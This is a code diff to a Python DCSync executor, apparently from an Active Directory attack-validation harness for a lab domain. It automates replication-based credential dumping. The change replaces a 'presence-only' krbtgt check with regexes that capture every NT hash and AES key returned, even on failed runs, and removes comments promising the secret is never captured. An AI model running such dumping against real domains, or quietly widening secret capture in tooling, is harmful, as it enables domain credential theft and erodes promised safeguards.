@@ -13,8 +13,8 @@ The operator/credential context (``-k`` ticket, NT hash, or password) comes from
 a replication READ: ``mutating=False``, no rollback. ``verified_recipe=True``
 (deterministic read).
 
-Secrets rule: the krbtgt hash is a SECRET -- it is PRESENCE-detected only (the
-matched content is never captured into a variable or the receipt); the proof
+Secrets rule: recovered hashes are held only in engine-only artifact keys,
+never in the receipt; the proof
 token is over public parts only (``DCSYNC``, domain, dc, ``krbtgt_replicated``).
 
 Scoring identity (ad-lab-harness ``truth/GOAD-proof.json``): DCSYNC keys on
@@ -41,7 +41,7 @@ from .. import proof
 from .. import states
 from .. import netresolve
 from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
-                   redact_argv, Capability, CAP_AES_KEY, CAP_NT_HASH)
+                   redact_argv, Capability, CAP_AES_KEY, CAP_NT_HASH, SecretReveal)
 from .coercion import _short_name
 
 
@@ -51,10 +51,10 @@ _RE_DCSYNC_KRBTGT = re.compile(
     r"^\s*(?:[^\s:]+[\\/])?krbtgt:\d+:[0-9a-f]{32}:[0-9a-f]{32}:::\s*$",
     re.I | re.M)
 
-# T4b composition: the krbtgt SIGNING KEY, extracted ONLY to thread in-memory to a
+# T4b composition: the krbtgt SIGNING KEY, extracted to thread in-memory to a
 # downstream forging edge (GOLDEN/DIAMOND/SAPPHIRE). AES256 is preferred (what the
 # forge proofs use); the NT hash is the fallback. These values are SECRET and are
-# never captured on the standalone path and never serialized into any receipt /
+# never serialized into any receipt /
 # ChainReport -- they ride a CAP_AES_KEY / CAP_NT_HASH capability the engine keeps
 # in-memory only (``base._SECRET_CHANNELS``), exactly like a shadow-creds/relay key.
 _RE_KRBTGT_AES256 = re.compile(
@@ -62,12 +62,19 @@ _RE_KRBTGT_AES256 = re.compile(
 _RE_KRBTGT_NT = re.compile(
     r"(?:^|\n)\s*(?:[^\s:]+[\\/])?krbtgt:\d+:[0-9a-f]{32}:([0-9a-f]{32}):::", re.I)
 
+# Capture every complete NT/AES record the invocation returned, including data
+# recovered before an eventual failed proof. Runtime only, never raw tool output.
+_RE_DUMP_NT = re.compile(
+    r"^\s*([^\s:]+):\d+:[0-9a-f]{32}:([0-9a-f]{32}):::\s*$", re.I | re.M)
+_RE_DUMP_AES = re.compile(
+    r"^\s*([^\s:]+):(aes(?:128|256)-cts-hmac-sha1-96):([0-9a-f]+)\s*$", re.I | re.M)
+
 
 def _extract_krbtgt_signing_key(output: str) -> tuple:
     """The krbtgt signing key + kind from a DCSync dump, for IN-MEMORY threading
     only. AES256 wins (``'aes'``); else the NT hash (``'nt'``). ``(None, None)``
-    when neither is present. The caller gates this on the composed path, so the
-    standalone DCSync stays presence-only (never captures the secret)."""
+    when neither is present. The caller gates capability production on the
+    composed path; live reveal capture is independent of capability production."""
     m = _RE_KRBTGT_AES256.search(output or "")
     if m:
         return m.group(1).lower(), "aes"
@@ -191,6 +198,14 @@ class DCSyncExecutor(ValidationExecutor):
         out_dir = Path(ctx.output_dir)
         out_dir.mkdir(parents=True, exist_ok=True)
 
+        # Private recovery channel, populated before any downstream proof/cleanup.
+        artifact = {"_reveal": []}
+        ctx._pending_reveal_artifact = artifact
+
+        def finish(*args):
+            artifact.update(self._artifact(*args))
+            return artifact
+
         steps: list[StepRecord] = []
         errors: list[str] = []
         gate = {"classifier": "not_required", "op": None}
@@ -207,7 +222,7 @@ class DCSyncExecutor(ValidationExecutor):
             gate["classifier"] = "denied"
             gate["op"] = "dcsync"
             errors.append("gate_denied:dcsync")
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish(steps, gate, mutation, None, False, errors)
         if verdict == "approved":
             gate["classifier"] = "approved"
             gate["op"] = "dcsync"
@@ -221,7 +236,7 @@ class DCSyncExecutor(ValidationExecutor):
         nb, nb_method, _ = netresolve.ensure_netbios(cfg, ctx.runner)
         record("resolve_netbios", [], None, True, note=f"NetBIOS={nb} via {nb_method}")
 
-        # DCSync: presence-only -- test whether the krbtgt replicated, never store it.
+        # DCSync: only the public replication predicate enters the receipt.
         # Composed: thread the front's credential (input_caps) + its KRB5CCNAME
         # (ctx.env) so this DCSync authenticates with what the front produced (B1).
         dcsync_argv = self._secretsdump_argv(cfg, dc_host, ctx.input_caps)
@@ -229,21 +244,23 @@ class DCSyncExecutor(ValidationExecutor):
         res = ctx.runner.run(dcsync_argv, env=run_env,
                              timeout=cfg.tool_timeout_s, cwd=str(out_dir))
         combined = (res.stdout or "") + "\n" + (res.stderr or "")
+        artifact["_reveal"].extend(
+            SecretReveal(self.technique, "nt_hash", principal, key)
+            for principal, key in _RE_DUMP_NT.findall(combined))
+        artifact["_reveal"].extend(
+            SecretReveal(self.technique, "aes_key", principal, key)
+            for principal, algorithm, key in _RE_DUMP_AES.findall(combined)
+            if len(key) == (64 if "256" in algorithm else 32))
         dcsync_ok = bool(res.returncode == 0 and not res.error and not res.timed_out
                          and _RE_DCSYNC_KRBTGT.search(combined))
         record("dcsync", dcsync_argv, res, dcsync_ok,
                note="krbtgt replicated" if dcsync_ok else "no replication data")
         if not dcsync_ok:
             errors.append("dcsync_failed")
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish(steps, gate, mutation, None, False, errors)
 
-        # T4b: ON THE COMPOSED PATH ONLY, capture the krbtgt signing key IN-MEMORY
-        # so a downstream forging edge (GOLDEN/DIAMOND/SAPPHIRE) can consume it.
-        # Standalone (``composed`` False) stays presence-only -- the secret is never
-        # extracted. The captured value rides an engine-only artifact field that
-        # ``_receipt_from`` DROPS (schema-only), so it never reaches the receipt;
-        # ``produced`` turns it into a secret-channel capability the engine keeps
-        # in-memory and out of every ChainReport.
+        # Capability routing remains composed-only; reveal was already captured
+        # above on both branches, even when replication proof later failed.
         signing_key = signing_kind = None
         if getattr(ctx, "composed", False):
             signing_key, signing_kind = _extract_krbtgt_signing_key(combined)
@@ -254,11 +271,14 @@ class DCSyncExecutor(ValidationExecutor):
                        "(success is Domain Admin)"),
             proof_token=proof.proof_token("DCSYNC", cfg.domain, dc_host, "krbtgt_replicated"),
             extra={"dc": _short_name(dc_host), "replicated_object": "krbtgt"})
-        artifact = self._artifact(steps, gate, mutation, terminal_fact, True, errors)
+        finish(steps, gate, mutation, terminal_fact, True, errors)
         if signing_key:
             artifact["_krbtgt_signing_key"] = signing_key    # engine-only; dropped by _receipt_from
             artifact["_krbtgt_signing_kind"] = signing_kind
         return artifact
+
+    def revealed_secrets(self, artifact: dict) -> list[SecretReveal]:
+        return list(artifact.get("_reveal", []))
 
     def produced(self, ctx, finding, params, artifact) -> list:
         """T4b: thread the recovered krbtgt signing key to a downstream forging
